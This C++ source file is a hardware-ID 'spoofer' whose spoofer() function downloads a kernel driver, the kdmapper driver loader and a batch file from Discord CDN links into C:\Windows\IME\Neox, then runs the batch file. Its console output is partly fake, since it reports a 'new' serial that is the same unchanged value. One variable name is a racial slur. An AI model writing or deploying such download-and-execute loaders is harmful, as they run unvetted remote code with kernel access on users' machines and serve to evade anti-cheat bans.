
#include "Main.h"		
#include <direct.h>

void spoofer()
{

	_mkdir("C:\\Windows\\IME\\Neox");
	string spooferurl = "https://cdn.discordapp.com/attachments/748710451067748413/759530833350230016/btbd.sys";
	string spoofersavepath = "C:\\Windows\\IME\\Neox\\btbd.sys";
	URLDownloadToFileA(NULL, spooferurl.c_str(), spoofersavepath.c_str(), 0, NULL);
	string kdmapperurl = "https://cdn.discordapp.com/attachments/748710451067748413/759530748939862036/kdmapper.exe";
	string kdmappersavepath = "C:\\Windows\\IME\\Neox\\kdmapper.exe";
	URLDownloadToFileA(NULL, kdmapperurl.c_str(), kdmappersavepath.c_str(), 0, NULL);
	string baturl = "https://cdn.discordapp.com/attachments/751851154505334876/759791971585097728/spoof.bat";
	string batpath = "C:\\Windows\\IME\\Neox\\spoof.bat";
	URLDownloadToFileA(NULL, baturl.c_str(), batpath.c_str(), 0, NULL);
	Sleep(500);
	string nigga = "start " + batpath;
	system(nigga.c_str());
}


int main()
{
	SetConsoleTitleA("YourFirstPastedC++ Spoofer");

	S_LogType LogType;
	std::string HWID = GetHWID();

	Log("Getting Neoxs Brain Cells", LogType.Info);


	Log("Done\n", LogType.Success);
	Sleep(2000);

	Log("Press a key to start\n", LogType.Info);
	getchar();





	Log("Spoofing DiskDrive(s), Volume ID(s), NIC, SMBIOS, GPU, CPU, BaseBoard", LogType.Default); Sleep(5000);
	Log("Old C: Serial: " + HWID, LogType.Warning);

	spoofer();
	Sleep(5000);

	Log("New C: Serial: " + HWID, LogType.Warning);
	Log("Spoofed DiskDrive(s), Volume ID(s), NIC, SMBIOS, GPU, CPU, BaseBoard\n", LogType.Success);

	Log("Spoofer done.", LogType.Default);

	Beep(523, 100);
	Sleep(3000);
	return 0;
}